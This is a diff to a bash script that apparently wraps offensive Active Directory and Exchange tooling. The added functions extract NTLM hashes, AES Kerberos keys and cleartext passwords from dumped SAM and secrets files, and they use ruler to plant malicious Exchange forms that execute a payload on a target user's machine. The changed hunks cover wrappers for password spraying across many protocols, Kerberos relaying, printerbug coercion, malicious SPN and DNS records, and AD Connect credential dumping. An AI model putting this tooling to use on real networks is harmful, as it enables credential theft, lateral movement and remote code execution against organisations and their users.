@@ -29,20 +29,122 @@ function showHelp(){
     return;
 }
 
+function parseNameDomain(){
+    # DESCRIPTION: Parse name and domain from string.
+    # ARGUMENT: VALUE.
+    VALUE=$1;
+    NAME=`echo ${VALUE}|cut -d':' -f 1`;
+    if [[ "$NAME" == *"\\"* ]]; then
+        DOMAIN=`echo ${NAME}|cut -d '\\' -f1`;
+        NAME=`echo ${NAME}|cut -d '\\' -f2`;
+    elif [[ "$NAME" == *"@"* ]]; then
+        DOMAIN=`echo ${NAME}|cut -d '@' -f2`;
+        NAME=`echo ${NAME}|cut -d '@' -f1`;
+    else
+        DOMAIN="LOCAL";
+    fi
+    printf "${DOMAIN^^}:${NAME^^}\n";
+    return;
+}
+function parseAESHashes(){
+    # DESCRIPTION: Parse AES-256 hashes from dumped secrets files.
+    # ARGUMENT: TARGET.
+    TARGET=$1;
+    FILE=`basename ${TARGET}`;
+    FILE=${FILE%.secrets};
+    for line in `cat ${TARGET}\
+        |tr -d " "\
+        |grep -e "^.*aes256-cts-hmac-sha1-96.*:.*";`; do
+        NAME=`echo ${line}|cut -d':' -f 1`;
+        AES=`echo ${line}|cut -d':' -f 3`;
+        NAME=`parseNameDomain ${NAME}`;
+        if [[ "$NAME" == *"LOCAL"* ]]; then
+            DOMAIN=${FILE};
+        else
+            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
+        fi
+        NAME=`echo ${NAME}|cut -d ':' -f2`;
+        printf "${DOMAIN^^} ${NAME^^} $AES\n";
+    done;
+    return;
+}
+
+function parsePasswords(){
+    # DESCRIPTION: Parse passwords from dumped secrets files.
+    # ARGUMENT: TARGET.
+    TARGET=$1;
+    FILE=`basename ${TARGET}`;
+    FILE=${FILE%.secrets};
+    for line in `cat ${TARGET}\
+            |grep -e "^.*:.*"\
+            |tr -d " "\
+            |grep -v "\$ASP.NET"\
+            |grep -v "\$MACHINE.ACC"\
+            |grep -v "_SC_GMSA"\
+            |grep -v -e "^.*L\$.*-.*-.*-.*-.*"\
+            |grep -v -e "^.*SCM:{.*}:.*"\
+            |grep -v "RasConnection\|RasDial"\
+            |grep -v -e "^.*:.*:.*:::.*"\
+            |grep -v "des-cbc"\
+            |grep -v -e "^.*aes.*-cts.*:.*"\
+            |grep -v -e "^.*dpapi_.*:.*"\
+            |grep -v -e "^.*NL.*KM:.*";`; do
+        NAME=`echo ${line}|cut -d':' -f 1`;
+        PASSWORD=`echo ${line}|cut -d':' -f 2-1000`;
+        NAME=`parseNameDomain ${NAME}`;
+        if [[ "$NAME" == *"LOCAL"* ]]; then
+            DOMAIN=${FILE};
+        else
+            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
+        fi
+        NAME=`echo ${NAME}|cut -d ':' -f2`;
+        echo "${DOMAIN^^} ${NAME^^} $PASSWORD";
+    done;
+    return;
+}
+
+function parseNTLMHashes(){
+    # DESCRIPTION: Parse NTLM hashes from dumped sam and secrets files.
+    # ARGUMENT: TARGET.
+    TARGET=$1;
+    FILE=`basename ${TARGET}`;
+    if [[ "$FILE" == *".sam"* ]]; then
+        FILE=${FILE%.sam};
+    elif [[ "$FILE" == *".secrets"* ]]; then
+        FILE=${FILE%.secrets};
+    fi
+    for line in `cat ${TARGET}\
+        |tr -d " "\
+        |egrep "^.*:.*:.*:::.*";`; do
+        NAME=`echo ${line}|cut -d':' -f 1`;
+        SHA=`echo ${line}|cut -d':' -f 3`;
+        NTLM=`echo ${line}|cut -d':' -f 4`;
+        NAME=`parseNameDomain ${NAME}`;
+        if [[ "$NAME" == *"LOCAL"* ]]; then
+            DOMAIN=${FILE};
+        else
+            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
+        fi
+        NAME=`echo ${NAME}|cut -d ':' -f2`;
+        printf "$DOMAIN $NAME $SHA $NTLM\n";
+    done;
+    return;
+}
+
 function installHelper(){
     # DESCRIPTION: Install dependencies for functions.
     # ARGUMENT: None.
-    cd /opt;
-    git clone https://github.com/dirkjanm/adidnsdump.git
-    git clone https://github.com/fox-it/adconnectdump.git
-    git clone https://github.com/Hackplayers/evil-winrm.git
-    git clone https://github.com/SecureAuthCorp/impacket.git
-    git clone https://github.com/dirkjanm/krbrelayx.git
-    git clone https://github.com/fox-it/mitm6.git
-    git clone https://github.com/the-useless-one/pywerview.git
-    git clone https://github.com/Gallopsled/pwntools.git
-    git clone https://github.com/fox-it/BloodHound.py.git
-    git clone https://github.com/5alt/ultrarelay.git
+    git clone https://github.com/dirkjanm/adidnsdump.git /opt/
+    git clone https://github.com/fox-it/adconnectdump.git /opt/
+    git clone https://github.com/Hackplayers/evil-winrm.git /opt/
+    git clone https://github.com/SecureAuthCorp/impacket.git /opt/
+    git clone https://github.com/dirkjanm/krbrelayx.git /opt/
+    git clone https://github.com/fox-it/mitm6.git /opt/
+    git clone https://github.com/the-useless-one/pywerview.git /opt/
+    git clone https://github.com/Gallopsled/pwntools.git /opt/
+    git clone https://github.com/fox-it/BloodHound.py.git /opt/
+    git clone https://github.com/5alt/ultrarelay.git /opt/
+    git clone https://github.com/sensepost/ruler.git /opt/
     apt-get install googlesearch;
     return;
 }
@@ -756,6 +858,56 @@ function getUsers(){
     return;
 }
 
+function rulerCheck(){
+    # DESCRIPTION: Query Exchange form for remote user.
+    # ARGUMENT: EMAIL.
+    EMAIL=$1;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --password ${PASSWORD} -b \
+            form display \
+            --suffix Windows;
+    else
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --hash ${HASH} \
+            form display \
+            --suffix Windows;
+    fi
+    return;
+}
+
+function rulerDelete(){
+    # DESCRIPTION: Delete Exchange form for remote user.
+    # ARGUMENT: EMAIL.
+    EMAIL=$1;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --password ${PASSWORD} -b \
+            form delete \
+            --suffix Windows;
+    else
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --hash ${HASH} \
+            form delete \
+            --suffix Windows;
+    fi
+    return;
+}
+
 # SECTION: Command execution helper functions:
 
 function winRMShell(){
@@ -921,6 +1073,36 @@ function dcomCommand(){
     return;
 }
 
+function rulerCommand(){
+    # DESCRIPTION: Execute Exchange form against remote user.
+    # ARGUMENT: EMAIL, PAYLOAD.
+    EMAIL=$1;
+    PAYLOAD=$2;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --password ${PASSWORD} -b \
+            form add \
+            --suffix Windows \
+            --input ${PAYLOAD} \
+            --send;
+    else
+          proxychains \
+            ruler \
+            --username ${USER} \
+            --email ${EMAIL} \
+            --hash ${HASH} \
+            form add \
+            --suffix Windows \
+            --input ${PAYLOAD} \
+            --send;
+    fi
+    return;
+}
+
 # SECTION: Client helper functions:
 
 function mountSSHShare(){
@@ -1041,13 +1223,13 @@ function dumpADConnect(){
     if [[ -z "$DOMAIN" ]]
     then
           proxychains \
-            python /opt/adconnectdump/adconnectdump.py \
+            python adconnectdump.py \
             -outputfile $TARGET \
             -no-pass -hashes $HASHES \
             ${USER}@${TARGET};
     else
           proxychains \
-            python /opt/adconnectdump/adconnectdump.py \
+            python adconnectdump.py \
             -outputfile $TARGET \
             -no-pass -hashes $HASHES \
             -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
@@ -1174,7 +1356,7 @@ function ultraRelay(){
     # DESCRIPTION: NTML (NTLM back to host) relay via Java applet.
     # ARGUMENT: ATTACKERIP.
     ATTACKERIP=$1;
-    python /opt/ultrarelay/ultrarelay.py \
+    python ultrarelay.py \
     -ip ${ATTACKERIP};
     return;
 }
@@ -1259,7 +1441,7 @@ function addDNS(){
     SPNHOST=$2;
     SERVER=$3;
     proxychains \
-    /opt/krbrelayx/dnstool.py \
+    dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -r "PWN-${SPNHOST}" -a add -d $IPADDRESS $SERVER;
@@ -1273,7 +1455,7 @@ function queryDNS(){
     SPNHOST=$2;
     SERVER=$3;
     proxychains \
-    /opt/krbrelayx/dnstool.py \
+    dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -r "PWN-${SPNHOST}" -a query -d $IPADDRESS $SERVER;
@@ -1287,7 +1469,7 @@ function removeDNS(){
     SPNHOST=$2;
     SERVER=$3;
     proxychains \
-    /opt/krbrelayx/dnstool.py \
+    dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -r "PWN-${SPNHOST}" -a remove -d $IPADDRESS $SERVER;
@@ -1300,7 +1482,7 @@ function removeSPN(){
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
-    /opt/krbrelayx/addspn.py \
+    addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -s "HOST/PWN-${SPNHOST}" \
@@ -1314,7 +1496,7 @@ function querySPN(){
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
-    /opt/krbrelayx/addspn.py \
+    addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -s "HOST/PWN-${SPNHOST}" \
@@ -1328,7 +1510,7 @@ function addSPN(){
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
-    /opt/krbrelayx/addspn.py \
+    addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -s "HOST/PWN-${SPNHOST}" \
@@ -1342,7 +1524,7 @@ function krbRelayUser(){
     TDOMAIN=$1;
     TUSER=$2;
     TPASSWORD=$3;
-    python /opt/krbrelayx/krbrelayx.py \
+    python krbrelayx.py \
     --krbsalt "${TDOMAIN}${TUSER}" \
     --krbpass $TPASSWORD;
     return;
@@ -1352,7 +1534,7 @@ function krbRelayComputer(){
     # DESCRIPTION: KRP relay for target AD computer using AES-256 hash.
     # ARGUMENT: AES256HASH.
     AES256HASH=$1;
-    python /opt/krbrelayx/krbrelayx.py \
+    python krbrelayx.py \
     -aesKey $AES256HASH;
     return;
 }
@@ -1371,7 +1553,7 @@ function printerRelay(){
     DCFQDN=$1;
     SPNHOST=$2;
     proxychains \
-    /opt/krbrelayx/printerbug.py \
+    printerbug.py \
     -hashes $HASHES \
     ${DOMAINUSER}@${DCFQDN} "PWN-${SPNHOST}";
     return;
@@ -1493,7 +1675,7 @@ function sqlMITM(){
     BEGIN=$3;
     END=$4;
     QUERY=$5;
-    python /opt/mitm/sqlmitm.py \
+    python sqlmitm.py \
     --begin_keyword "$BEGIN" \
     --end_keyword "$END" \
     eth0 mssql \
@@ -1510,7 +1692,7 @@ function sprayHTTP(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/http_spray.py \
+    python http_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1523,7 +1705,7 @@ function sprayHTTPNTLM(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/http_ntlm_spray.py \
+    python http_ntlm_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1536,7 +1718,7 @@ function sprayADFS(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/adfs_spray.py \
+    python adfs_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1549,7 +1731,7 @@ function sprayIMAP(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/imap_spray.py \
+    python imap_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1562,7 +1744,7 @@ function sprayLDAP(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/ldap_spray.py \
+    python ldap_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1575,7 +1757,7 @@ function sprayMSSQL(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/mssql_spray.py \
+    python mssql_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1588,7 +1770,7 @@ function sprayPSRM(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/psrm_spray.py \
+    python psrm_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1601,7 +1783,7 @@ function spraySMB(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/smb_spray.py \
+    python smb_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1614,7 +1796,7 @@ function spraySMTP(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/smtp_spray.py \
+    python smtp_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1627,7 +1809,7 @@ function sprayWinRM(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/winrm_spray.py \
+    python winrm_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
@@ -1640,7 +1822,7 @@ function sprayWMI(){
     DICTIONARY=$3;
     TARGETPASSWORD=$4;
     proxychains \
-    python /opt/spraying/wmi_spray.py \
+    python wmi_spray.py \
     $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
     return;
 }
